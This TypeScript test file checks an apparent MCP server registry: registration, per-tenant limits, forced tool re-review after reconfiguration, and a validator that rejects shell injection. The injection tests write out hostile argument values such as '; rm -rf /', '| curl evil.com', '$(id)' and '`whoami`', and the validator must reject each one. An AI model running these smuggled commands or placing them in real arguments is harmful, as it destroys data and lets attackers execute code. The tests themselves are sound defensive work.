import assert from 'node:assert/strict';
import test from 'node:test';
import { ClientStore } from '../../packages/client-core/src/index.js';
import { validateClientTenantCreateInput } from '../../packages/client-schema/src/index.js';
import {
  McpError, validateMcpServerRegisterInput, hashSchema, MAX_MCP_SERVERS_PER_TENANT,
} from '../../packages/mcp-schema/src/index.js';

function makeStore() { return new ClientStore(':memory:'); }

function createActiveTenant(store: ClientStore) {
  const tenant = store.createTenant(validateClientTenantCreateInput({
    display_name: 'MCP Co', environment: 'development',
    deployment_binding: 'dep_1', policy_profile: 'default',
    allowed_connector_types: ['mcp-stdio'],
  }), 'admin_1');
  return store.activateTenant(tenant.tenant_id, tenant.state_version);
}

function validMcpInput() {
  return validateMcpServerRegisterInput({
    name: 'CRM Server', transport: 'stdio', executable: 'node',
    args: ['server.js'], env_allowlist: [], credential_ref: null,
  });
}

// ── §13: register MCP server with valid input ────────────────────────────────

test('§13: register MCP server — yields REGISTERED status with config_hash and mcps_ prefix', () => {
  const store = makeStore();
  const tenant = createActiveTenant(store);

  const server = store.registerMcpServer(tenant.tenant_id, validMcpInput(), 'admin_1');
  assert.ok(server.mcp_server_id.startsWith('mcps_'));
  assert.equal(server.status, 'REGISTERED');
  assert.equal(server.transport, 'stdio');
  assert.equal(server.executable, 'node');
  assert.ok(server.config_hash.length > 0);
  assert.equal(server.state_version, 0);
  store.close();
});

// ── §14: shell injection prevention ──────────────────────────────────────────

test('§14: shell injection in args rejected — semicolon', () => {
  assert.throws(
    () => validateMcpServerRegisterInput({
      name: 'Evil', transport: 'stdio', executable: 'node',
      args: ['--config', '; rm -rf /'], env_allowlist: [], credential_ref: null,
    }),
    (e: unknown) => { assert.ok(e instanceof McpError); assert.equal(e.code, 'MCP_PROTOCOL_ERROR'); return true; },
  );
});

test('§14: shell injection in args rejected — pipe, ampersand, backtick, $()', () => {
  const payloads = ['| curl evil.com', '&& wget x', '`whoami`', '$(id)'];
  for (const payload of payloads) {
    assert.throws(
      () => validateMcpServerRegisterInput({
        name: 'Evil', transport: 'stdio', executable: 'node',
        args: [payload], env_allowlist: [], credential_ref: null,
      }),
      (e: unknown) => { assert.ok(e instanceof McpError); return true; },
      `payload "${payload}" must be rejected`,
    );
  }
});

test('§14: shell metacharacters in executable rejected', () => {
  // Semicolons/pipes are always rejected outright. A space is only accepted when it sits inside real
  // path structure (a Windows install path like "C:\Program Files\nodejs\node.exe" legitimately has
  // one) — a bare "word word" with no path structure at all looks like a smashed-together command and
  // is rejected too.
  const badExecutables = ['bash -c evil', 'node;rm', 'cmd|evil', 'a b'];
  for (const exe of badExecutables) {
    assert.throws(
      () => validateMcpServerRegisterInput({
        name: 'Evil', transport: 'stdio', executable: exe,
        args: [], env_allowlist: [], credential_ref: null,
      }),
      (e: unknown) => { assert.ok(e instanceof McpError); return true; },
      `executable "${exe}" must be rejected`,
    );
  }
});

// ── §20: server reconfiguration forces tool review ───────────────────────────

test('§20: reconfiguring an MCP server forces enabled tools back into POLICY_REVIEW_REQUIRED', () => {
  const store = makeStore();
  const tenant = createActiveTenant(store);
  const server = store.registerMcpServer(tenant.tenant_id, validMcpInput(), 'admin_1');

  // Discover and enable a tool
  store.recordDiscovery(tenant.tenant_id, server.mcp_server_id,
    [{ name: 'crm.lookup', description: 'Lookup', input_schema: { type: 'object' } }], hashSchema);
  const tool = store.listTools(tenant.tenant_id, server.mcp_server_id)[0]!;
  store.enableTool(tenant.tenant_id, tool.tool_id, tool.state_version, {
    risk_class: 'LOW', allowed_operations: ['read'], resource_patterns: [],
    requires_human_approval: false, requires_vad: false, policy_id: 'pol_1',
    runtime_limits: {}, cost_limits: {}, bound_by: 'operator_1',
  });
  assert.equal(store.getTool(tenant.tenant_id, tool.tool_id).enabled, true);

  // Reconfigure the server (change args)
  // Re-read the server to get the fresh state_version (discovery bumped it)
  const freshServer = store.getMcpServer(tenant.tenant_id, server.mcp_server_id);
  const newInput = validateMcpServerRegisterInput({
    name: 'CRM Server v2', transport: 'stdio', executable: 'node',
    args: ['server-v2.js'], env_allowlist: [], credential_ref: null,
  });
  store.reconfigureMcpServer(tenant.tenant_id, server.mcp_server_id, freshServer.state_version, newInput);

  // The tool is now disabled and requires review — prior trust is never inherited
  const afterTool = store.getTool(tenant.tenant_id, tool.tool_id);
  assert.equal(afterTool.enabled, false);
  assert.equal(afterTool.review_status, 'POLICY_REVIEW_REQUIRED');
  store.close();
});

// ── §146: MAX_MCP_SERVERS_PER_TENANT enforced ────────────────────────────────

test('§146: registering beyond MAX_MCP_SERVERS_PER_TENANT is rejected', () => {
  const store = makeStore();
  const tenant = createActiveTenant(store);

  for (let i = 0; i < MAX_MCP_SERVERS_PER_TENANT; i++) {
    const input = validateMcpServerRegisterInput({
      name: `Server ${i}`, transport: 'stdio', executable: 'node',
      args: [`s${i}.js`], env_allowlist: [], credential_ref: null,
    });
    store.registerMcpServer(tenant.tenant_id, input, 'admin_1');
  }

  // The next one must be rejected
  assert.throws(
    () => store.registerMcpServer(tenant.tenant_id, validMcpInput(), 'admin_1'),
    (e: unknown) => { assert.ok(e instanceof McpError); return true; },
  );
  store.close();
});
